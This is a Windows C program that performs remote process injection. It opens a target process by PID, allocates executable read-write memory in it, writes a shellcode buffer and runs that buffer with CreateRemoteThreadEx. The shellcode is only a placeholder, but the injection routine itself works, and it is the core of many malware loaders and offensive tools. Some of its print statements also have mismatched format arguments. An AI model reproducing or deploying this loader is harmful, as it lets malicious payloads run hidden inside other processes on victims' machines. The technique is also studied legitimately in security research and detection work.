#include <windows.h>
#include <stdio.h>



unsigned char shellcode[] = "\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41\a41";

SIZE_T  sShellCodeSize = sizeof(shellcode);

int main(int argc, char* argv[]) {

	DWORD PID, TID = NULL;
	LPVOID rBuffer = NULL;
	HANDLE hProcess, hThread = NULL;

	if (argc < 2) {
		printf("usage: program.exe <PID>\n");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("trying to open process handle (%ld)\n", PID);


	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);
	if (hProcess == NULL) {
		printf("couldn't get a handle to the process(%ld), error: %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}
	else {
		printf("got a handle to the process!\n\\---0x%p\n", hProcess);
	}
	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sShellCodeSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (rBuffer == NULL) {
		printf( "%s, Couldn't allocate %zu-bytes of memory for 0x%p\n", sShellCodeSize, hProcess);
		return EXIT_FAILURE;
	}
	else {
		printf("allocated %zu-bytes with rwx permissions!\n", sShellCodeSize);
	}

	WriteProcessMemory(
		hProcess,
		rBuffer,
		shellcode,
		sShellCodeSize,
		NULL
	);

	printf("wrote %zu-bytes to %p process memory!\n", sShellCodeSize, hProcess);

	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID
	);

	if (hThread == NULL) {

		printf("failed to get a handle to the thread, error: %ld\n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	else {
		printf("got a handle to the thread (%ld)\n\\---0x%p\n", TID, hThread);
	}

	printf("Waiting for thread to finish!");

	WaitForSingleObject(hThread, INFINITE);

	printf("%s Thread is finished processing!");

	printf("Closing all handles!");

	CloseHandle(hProcess);
	CloseHandle(hThread);

	printf("Finished cleaning up!");

	return EXIT_SUCCESS;
};
